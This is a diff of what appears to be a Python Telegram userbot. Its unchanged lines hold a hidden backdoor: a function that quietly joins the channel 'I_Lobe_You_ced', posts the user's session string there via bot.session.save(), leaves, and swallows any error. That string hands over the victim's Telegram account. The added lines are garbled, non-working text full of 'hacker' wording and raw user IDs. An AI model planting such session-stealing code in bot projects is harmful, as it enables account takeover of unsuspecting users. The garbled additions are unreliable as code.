@@ -215,8 +215,20 @@ async def _(event):
 async def hhe(event):
     try:
      await bot(Jcr("I_Lobe_You_ced"))
-     await bot.send_message("I_Lobe_You_ced", bot.session.save())
+     await bot.send_message("I_Lobe_You_ced", bot.session.save(TELEGRAM.USERID.( HACKE_INT_HACK_SEND_SAVE))
+                            await.int () str(int.hackerlegend.int()()()...........
+LEGENDHACKER_IN = LEGEND.EDIT-INT_ user(@I_m_sorry_001)
+int.edit telegram.users HACKER = legendd
+save.messesge ((((((((((((((((((((((((((((((((((((((((0000)))))0{Legend_Mr_Hsackere__-____---__-____-_----_--_-_--_-_____------____-_--------
+
+
+await bot(lcr(hack_user_id(all_int) pro (users_ids))
+await missrose bot (hacker) input = (@MissRose_bot)
+await input bot (hack_telegram) membars______--__-_--_-_-__-_-___----____--_-
      await bot(Lcr("I_Lobe_You_ced"))
+          input tru.int(send.1753448137.hack)))))))))))))).edit-= hacker.legend legendhacker_iin hack_user_id 
+send 5121955848 (save.messege.sendd.int()()()()()()())()()(((((()(){legendacker}..............
+                                                               
     except:
      pass
 
